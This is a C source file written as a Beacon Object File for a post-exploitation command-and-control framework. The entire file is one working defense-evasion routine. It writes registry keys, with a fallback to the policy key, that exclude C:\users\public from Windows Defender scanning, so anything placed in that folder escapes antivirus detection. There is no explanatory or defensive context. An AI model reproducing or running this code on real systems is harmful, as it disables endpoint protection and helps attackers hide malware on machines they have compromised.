#include <windows.h>
#include "bofdefs.h"
#include "base.c"

void addDefenderExclusion() {
    HKEY hKey = NULL;
    DWORD disposition = 0;
    LONG ret = ADVAPI32$RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0,
        NULL,
        0,
        KEY_SET_VALUE | KEY_QUERY_VALUE | KEY_WOW64_64KEY,
        NULL,
        &hKey,
        &disposition);

    if (ret != ERROR_SUCCESS) {
        HKEY hPol = NULL;
        ret = ADVAPI32$RegCreateKeyExA(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths",
            0,
            NULL,
            0,
            KEY_SET_VALUE | KEY_QUERY_VALUE | KEY_WOW64_64KEY,
            NULL,
            &hPol,
            &disposition);
        if (ret != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyExA failed: %ld", ret);
            return;
        }
        const char empty[] = "";
        ret = ADVAPI32$RegSetValueExA(
            hPol,
            "C:\\users\\public",
            0,
            REG_SZ,
            (const BYTE*)empty,
            sizeof(empty));
        if (ret == ERROR_SUCCESS) {
            internal_printf("Added Defender exclusion (policy): C:\\users\\public\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "RegSetValueExA failed: %ld", ret);
        }
        ADVAPI32$RegCloseKey(hPol);
        return;
    }

    DWORD val = 0;
    ret = ADVAPI32$RegSetValueExA(
        hKey,
        "C:\\users\\public",
        0,
        REG_DWORD,
        (const BYTE*)&val,
        sizeof(val));

    if (ret == ERROR_SUCCESS) {
        internal_printf("Added Defender exclusion: C:\\users\\public\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueExA failed: %ld", ret);
    }

    ADVAPI32$RegCloseKey(hKey);
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    if(!bofstart())
    {
        return;
    }
    addDefenderExclusion();
    printoutput(TRUE);
};

#else

int main()
{
    addDefenderExclusion();
}

#endif
